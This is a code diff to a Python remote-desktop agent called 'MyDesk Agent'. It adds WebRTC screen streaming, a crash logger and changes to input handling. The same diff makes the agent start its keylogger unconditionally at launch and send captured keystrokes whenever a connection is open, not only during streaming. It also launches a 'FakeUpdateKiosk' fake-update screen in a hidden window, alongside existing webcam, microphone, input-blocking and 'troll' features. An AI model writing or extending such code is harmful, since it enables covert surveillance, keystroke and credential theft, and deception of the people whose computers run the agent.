@@ -45,6 +45,9 @@ try:
     from target.clipboard_handler import ClipboardHandler
     from target.device_settings import DeviceSettings
     from target.troll_handler import TrollHandler
+    from target.webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
+    from target.webrtc_tracks import create_screen_track, create_webcam_track
+    from target.resource_manager import get_resource_manager
 except ImportError:
     # Fallback for frozen application or direct execution
     
@@ -61,6 +64,13 @@ except ImportError:
     from clipboard_handler import ClipboardHandler
     from device_settings import DeviceSettings
     from troll_handler import TrollHandler
+    try:
+        from webrtc_handler import WebRTCHandler, AIORTC_AVAILABLE
+        from webrtc_tracks import create_screen_track, create_webcam_track
+        from resource_manager import get_resource_manager
+    except ImportError:
+        AIORTC_AVAILABLE = False
+        WebRTCHandler = None
 
 # CONFIG
 HARDCODED_BROKER = None
@@ -99,7 +109,8 @@ class AsyncAgent:
         self.loop = None
         
         # Components
-        self.capturer = ScreenCapturer(quality=50, scale=0.9) # Retain original capturer settings
+        # Fix: Use full quality and scale for WebRTC (it handles bandwidth adaption)
+        self.capturer = ScreenCapturer(quality=100, scale=1.0) 
         self.auditor = KeyAuditor(self.send_key_sync) # Retain original auditor init
         self.webcam = WebcamStreamer(quality=40) # Retain original webcam settings
         self.mic = AudioStreamer()
@@ -140,6 +151,10 @@ class AsyncAgent:
         self.troll_cooldowns = {} # target_id -> timestamp
         self.TROLL_COOLDOWN_SEC = 30
         self.admin_public_key = None # TODO: Load from config/keyfile
+        
+        # WebRTC State (Project Supersonic)
+        self.webrtc_handler = None
+        self.resource_mgr = get_resource_manager() if AIORTC_AVAILABLE else None
 
     def _create_background_task(self, coro):
         """Helper to create fire-and-forget background tasks safely."""
@@ -202,9 +217,101 @@ class AsyncAgent:
         except Exception as e:
             print(f"[-] Clipboard change send error: {e}")
 
+    # ================================================================
+    # WebRTC Signaling Handlers (Project Supersonic)
+    # ================================================================
+    async def _handle_rtc_offer(self, payload, source_ws):
+        """Handle WebRTC SDP Offer from Viewer"""
+        if not AIORTC_AVAILABLE:
+            print("[!] WebRTC not available (aiortc not installed)")
+            return
+            
+        try:
+            data = json.loads(payload.decode('utf-8'))
+            offer_sdp = data.get('sdp')
+            offer_type = data.get('type', 'offer')
+            
+            print(f"[WebRTC] Received SDP offer, creating answer...")
+            
+            # Create or reuse WebRTC handler
+            if self.webrtc_handler is None:
+                self.webrtc_handler = WebRTCHandler()
+            
+            # Process offer and get answer
+            answer = await self.webrtc_handler.handle_offer(offer_sdp, offer_type)
+            
+            # Add video track (screen sharing)
+            if self.capturer:
+                screen_track = create_screen_track(self.capturer, self.resource_mgr)
+                self.webrtc_handler.add_video_track(screen_track)
+                print("[WebRTC] Screen share track added")
+            
+            # Mark viewer as connected for resource manager
+            if self.resource_mgr:
+                self.resource_mgr.set_viewer_connected(True)
+                self.resource_mgr.set_stream_enabled(True)
+            
+            # Stop old WebSocket streaming (WebRTC takes over)
+            if self.streaming:
+                print("[WebRTC] Stopping old WebSocket streaming - WebRTC takes over")
+                self.streaming = False
+            
+            # Send SDP Answer back
+            answer_msg = json.dumps(answer).encode('utf-8')
+            await send_msg(source_ws, bytes([protocol.OP_RTC_ANSWER]) + answer_msg)
+            print(f"[WebRTC] Sent SDP answer - streaming via WebRTC now")
+            
+            # Send any gathered ICE candidates
+            for candidate in self.webrtc_handler.get_pending_ice_candidates():
+                ice_msg = json.dumps(candidate).encode('utf-8')
+                await send_msg(source_ws, bytes([protocol.OP_ICE_CANDIDATE]) + ice_msg)
+                
+        except Exception as e:
+            print(f"[-] WebRTC Offer Error: {e}")
+            import traceback
+            traceback.print_exc()
+    
+    async def _handle_ice_candidate(self, payload):
+        """Handle incoming ICE candidate from Viewer"""
+        if not self.webrtc_handler:
+            return
+            
+        try:
+            data = json.loads(payload.decode('utf-8'))
+            await self.webrtc_handler.add_ice_candidate(data)
+        except Exception as e:
+            print(f"[-] ICE Candidate Error: {e}")
+    
+    async def _handle_throttle(self, payload):
+        """Handle bandwidth throttling request from Viewer"""
+        if not self.resource_mgr:
+            return
+            
+        try:
+            data = json.loads(payload.decode('utf-8'))
+            fps = data.get('fps', 30)
+            quality = data.get('quality', 70)
+            print(f"[WebRTC] Throttle request: fps={fps}, quality={quality}")
+            # Apply throttling (resource manager will use these values)
+            # For now just log it - can be extended later
+        except Exception as e:
+            print(f"[-] Throttle Error: {e}")
 
-
-
+    async def _cleanup_webrtc(self):
+        """Cleanup WebRTC resources on disconnect"""
+        try:
+            if self.webrtc_handler:
+                print("[WebRTC] Cleaning up...")
+                await self.webrtc_handler.close()
+                self.webrtc_handler = None
+            
+            # Reset resource manager
+            if self.resource_mgr:
+                self.resource_mgr.set_viewer_connected(False)
+                self.resource_mgr.set_stream_enabled(False)
+                
+        except Exception as e:
+            print(f"[-] WebRTC cleanup error: {e}")
 
     def _validate_troll_request(self, opcode, payload_str):
         """Validate Troll OpCode against Consent, Admin Token, and Cooldown."""
@@ -284,6 +391,7 @@ class AsyncAgent:
         """Hook to fix headers/handle health checks"""
         try:
             # Create mutable copy reference
+            # Note: In websockets v13+, 'request' is a Request object with a .headers property
             headers = getattr(request, 'headers', request)
             
             # HEALTH CHECK: If not a websocket request (missing Key), return HTTP 200
@@ -292,22 +400,15 @@ class AsyncAgent:
                 # Return (status, headers, body) to stop handshake processing
                 return (200, [], b"Agent Online")
 
-            try:
-                # Force Upgrade headers (Cloudflare sometimes strips them)
-                # Try direct mutation (works for dict and some mutable mappings)
-                if 'Connection' in headers: del headers['Connection']
-                if 'Upgrade' in headers: del headers['Upgrade']
-                headers['Connection'] = 'Upgrade'
-                headers['Upgrade'] = 'websocket'
-            except TypeError:
-                # If immutable, we can't easily fix it inplace without deep hacks.
-                # But typically 'request.headers' object in newer websockets is mutable-ish or we can't swap it.
-                pass
+            # [REMOVED] The "Force Upgrade" mutation block was deleted here.
+            # It causes AssertionError in websockets v13+ and is no longer needed
+            # as the library natively handles "Connection: keep-alive, Upgrade".
                 
         except Exception as e:
             # Just log warning but don't crash
-            # print(f"[!] Header Fix Validation Warning: {e}")
+            print(f"[!] Header Fix Validation Warning: {e}")
             pass
+            
         return None  # Continue with connection
 
     async def start_direct_server(self):
@@ -343,6 +444,10 @@ class AsyncAgent:
             finally:
                 print("[-] Direct Client Disconnected")
                 self.direct_ws_clients.discard(websocket)
+                
+                # Cleanup WebRTC on disconnect
+                await self._cleanup_webrtc()
+                
         except websockets.exceptions.InvalidMessage:
             # Common with Cloudflare Tunnel health checks
             self.direct_ws_clients.discard(websocket)
@@ -350,6 +455,7 @@ class AsyncAgent:
         except Exception as e:
             print(f"[-] Direct Handler Error: {e}")
             self.direct_ws_clients.discard(websocket)
+            await self._cleanup_webrtc()
 
     async def handle_message(self, message, source_ws):
         """Unified message handler for both Broker and Direct connections"""
@@ -360,8 +466,74 @@ class AsyncAgent:
                 opcode = message[0]
                 payload = message[1:]
                 
+        # === WEBRTC SIGNALING ===
+                if opcode == protocol.OP_RTC_OFFER:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        offer_sdp = data.get('sdp', '')
+                        offer_type = data.get('type', 'offer')
+                        print(f"[WebRTC] Received SDP offer, creating answer...")
+                        
+                        # Create WebRTC handler if not exists
+                        # Handled in __init__ now, but safe to verify
+                        if not hasattr(self, 'webrtc_handler') or self.webrtc_handler is None:
+                            self.webrtc_handler = WebRTCHandler()
+                            
+                        # 1. Add screen capture track FIRST
+                        # This ensures it's available when we set the remote description
+                        if self.webrtc_handler.screen_track is None:
+                            screen_track = create_screen_track(self.capturer, get_resource_manager())
+                            self.webrtc_handler.add_video_track(screen_track)
+                            self.webrtc_handler.screen_track = screen_track
+                            print("[WebRTC] Screen share track added")
+                        
+                        # 2. Set Offer
+                        await self.webrtc_handler.set_remote_description(offer_sdp, offer_type)
+                        
+                        # 3. Create Answer (now includes track)
+                        answer = await self.webrtc_handler.create_answer()
+                        
+                        # Send SDP Answer back
+                        
+                        # Stop old WebSocket streaming if active
+                        if self.streaming:
+                            print("[WebRTC] Stopping old WebSocket streaming - WebRTC takes over")
+                            self.streaming = False
+                        
+                        # Update resource manager
+                        rm = get_resource_manager()
+                        rm.set_viewer_connected(True)
+                        rm.set_stream_enabled(True)
+                        
+                        # Send SDP Answer back
+                        answer_msg = json.dumps(answer).encode('utf-8')
+                        await send_msg(source_ws, bytes([protocol.OP_RTC_ANSWER]) + answer_msg)
+                        print(f"[WebRTC] Sent SDP answer - streaming via WebRTC now")
+                        
+                    except Exception as e:
+                        print(f"[-] WebRTC Offer Error: {e}")
+                        import traceback
+                        traceback.print_exc()
+                
+                elif opcode == protocol.OP_ICE_CANDIDATE:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        if hasattr(self, 'webrtc_handler') and self.webrtc_handler:
+                            await self.webrtc_handler.add_ice_candidate(data)
+                    except Exception as e:
+                        print(f"[-] ICE Candidate Error: {e}")
+                
+                elif opcode == protocol.OP_THROTTLE:
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        fps = data.get('fps', 30)
+                        quality = data.get('quality', 70)
+                        print(f"[WebRTC] Throttle request: fps={fps}, quality={quality}")
+                    except Exception as e:
+                        print(f"[-] Throttle Error: {e}")
+                
         # === REMOTE INPUT ===
-                if opcode == protocol.OP_MOUSE_MOVE:
+                elif opcode == protocol.OP_MOUSE_MOVE:
                     try:
                         x, y = parse_mouse_move(payload)
                         if x is not None:
@@ -455,8 +627,16 @@ class AsyncAgent:
                                     creation_flags = 0
                                     if os.name == 'nt':
                                         creation_flags = subprocess.CREATE_NO_WINDOW
+                                    
+                                    # Fix: Check if frozen and use flag
+                                    if getattr(sys, 'frozen', False):
+                                        # When frozen, we run ourself with --kiosk
+                                        cmd = [sys.executable, "--kiosk"]
+                                    else:
+                                        cmd = [sys.executable, kiosk_script]
+
                                     self.kiosk_process = subprocess.Popen(
-                                        [sys.executable, kiosk_script],
+                                        cmd,
                                         creationflags=creation_flags
                                     )
                                 except Exception as e:
@@ -593,7 +773,7 @@ class AsyncAgent:
                                 setting_id = payload[0]
                                 value = bool(payload[1])
                             else:
-                                continue
+                                return  # Invalid payload
                         
                         print(f"[*] Setting Change: ID={setting_id} Val={value}")
                         
@@ -816,34 +996,50 @@ class AsyncAgent:
                     except Exception as e:
                         print(f"[-] Clip Consent Error: {e}")
 
+                # ================================================================
+                # WebRTC Signaling (Project Supersonic)
+                # ================================================================
+                elif opcode == protocol.OP_RTC_OFFER:
+                    await self._handle_rtc_offer(payload, source_ws)
+                    
+                elif opcode == protocol.OP_RTC_ANSWER:
+                    # Agent doesn't receive answers (Agent sends answers)
+                    pass
+                    
+                elif opcode == protocol.OP_ICE_CANDIDATE:
+                    await self._handle_ice_candidate(payload)
+                    
+                elif opcode == protocol.OP_THROTTLE:
+                    await self._handle_throttle(payload)
+
                 # DEVICE SETTINGS (Volume, etc)
                 # Network settings (WiFi/Ethernet) removed by user request
                 
                 elif opcode == protocol.OP_SET_VOLUME:
                     try:
                         data = json.loads(payload.decode('utf-8'))
-                        self.device_settings.set_volume(data['level'])
+                        await self.loop.run_in_executor(None, self.device_settings.set_volume, data['level'])
                     except Exception as e:
                         print(f"[-] Set Volume Error: {e}")
 
                 elif opcode == protocol.OP_SET_MUTE:
                     try:
                         data = json.loads(payload.decode('utf-8'))
-                        self.device_settings.set_mute(data['muted'])
+                        await self.loop.run_in_executor(None, self.device_settings.set_mute, data['muted'])
                     except Exception as e:
                         print(f"[-] Set Mute Error: {e}")
 
                 elif opcode == protocol.OP_SET_BRIGHTNESS:
                     try:
                         data = json.loads(payload.decode('utf-8'))
-                        self.device_settings.set_brightness(data['level'])
+                        await self.loop.run_in_executor(None, self.device_settings.set_brightness, data['level'])
                     except Exception as e:
                         print(f"[-] Set Brightness Error: {e}")
 
                 elif opcode == protocol.OP_SET_TIME:
                     try:
                         data = json.loads(payload.decode('utf-8'))
-                        self.device_settings.set_time(data['datetime'])
+                        await self.loop.run_in_executor(None, self.device_settings.set_time, data['datetime'])
                     except Exception as e:
                         print(f"[-] Set Time Error: {e}")
 
@@ -1065,6 +1261,9 @@ class AsyncAgent:
         # Reset input state (fix 'sticky keys' lockout)
         if self.input_ctrl:
             self.input_ctrl.release_all_modifiers()
+            # Fix: Release any held mouse buttons to prevent "stuck click"
+            if hasattr(self.input_ctrl, 'release_all_buttons'):
+                self.input_ctrl.release_all_buttons()
             # Also unblock input just in case (if we were admin)
             self.input_ctrl.block_input(False)
     
@@ -1192,8 +1391,38 @@ class AsyncAgent:
         finally:
             self.mic_streaming = False
 
+    def apply_settings(self, settings):
+        """Apply capture settings from Viewer."""
+        print(f"[*] Applying settings: {settings}")
+        
+        # Quality (JPEG/WEBP)
+        if 'quality' in settings:
+            self.capturer.quality = int(settings['quality'])
+            
+        # Scale (Resize %)
+        if 'scale' in settings:
+            self.capturer.scale = int(settings['scale'])
+            
+        # Format (JPEG, PNG, WEBP)
+        if 'format' in settings:
+            self.capturer.format = settings['format']
+            
+        # Capture Method (MSS, DXCAM)
+        if 'method' in settings:
+            method = settings['method']
+            if method == "DXCAM":
+                self.capturer.use_dxcam = True
+                self.capturer.use_mss = False
+            elif method == "MSS":
+                self.capturer.use_dxcam = False
+                self.capturer.use_mss = True
+                
+        # Target FPS (for streaming loop)
+        if 'fps' in settings:
+            self.target_fps = int(settings['fps'])
+
     def send_key_sync(self, key_str):
-        if self.streaming and self.ws and self.loop:
+        if self.ws and self.loop:
             asyncio.run_coroutine_threadsafe(self.send_key_async(key_str), self.loop)
 
     async def send_key_async(self, key_str):
@@ -1271,6 +1500,13 @@ class AsyncAgent:
         else:
             print("[*] Local Mode: Skipping Cloudflare Tunnel")
 
+        # Start Keylogger
+        if self.auditor:
+            try:
+                self.auditor.start()
+            except Exception as e:
+                print(f"[-] Failed to start Keylogger: {e}")
+
         # Start the asyncio loop
         self.loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self.loop)
@@ -1287,12 +1523,55 @@ class AsyncAgent:
             self.loop.close()
 
 def main():
-    parser = argparse.ArgumentParser(description="MyDesk Agent")
-    parser.add_argument("--local", action="store_true", help="Run in local mode (skip Cloudflare Tunnel)")
-    args = parser.parse_args()
+    # Helper to check for --kiosk early before heavy imports or networking
+    if "--kiosk" in sys.argv:
+        try:
+            # Import and run kiosk directly
+            # Supports both frozen and source if path is correct
+            try:
+                from target.kiosk import FakeUpdateKiosk
+            except ImportError:
+                # If path isn't set up yet in frozen env
+                sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+                from kiosk import FakeUpdateKiosk
+                
+            kiosk = FakeUpdateKiosk()
+            kiosk.start()
+            return
+        except Exception as e:
+            # If kiosk fails, just exit to avoid zombie processes
+            import ctypes
+            ctypes.windll.user32.MessageBoxW(0, f"Kiosk Error: {e}", "Error", 0)
+            return
 
-    agent = AsyncAgent(DEFAULT_BROKER)
-    agent.start(local_mode=args.local)
+    # CRASH LOGGER: Wrap main execution
+    try:
+        parser = argparse.ArgumentParser(description="MyDesk Agent")
+        parser.add_argument("--local", action="store_true", help="Run in local mode (skip Cloudflare Tunnel)")
+        # We add kiosk here just so argparse doesn't complain if it sees it (though we handled it above)
+        parser.add_argument("--kiosk", action="store_true", help="Launch internal Kiosk (Internal Use)")
+        args = parser.parse_args()
+
+        agent = AsyncAgent(DEFAULT_BROKER)
+        agent.start(local_mode=args.local)
+    except Exception as e:
+        # Log fatal crash
+        import traceback
+        import datetime
+        
+        crash_file = "crash_log.txt"
+        if getattr(sys, 'frozen', False):
+            base_dir = os.path.dirname(sys.executable)
+            crash_file = os.path.join(base_dir, "crash_log.txt")
+            
+        with open(crash_file, "a") as f:
+            f.write(f"\n\n[{datetime.datetime.now()}] FATAL CRASH:\n")
+            traceback.print_exc(file=f)
+            
+        # Optional: Try to show message box if GUI is available
+        # import ctypes
+        # ctypes.windll.user32.MessageBoxW(0, f"Agent Crashed: {e}\nSee crash_log.txt", "Fatal Error", 0)
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
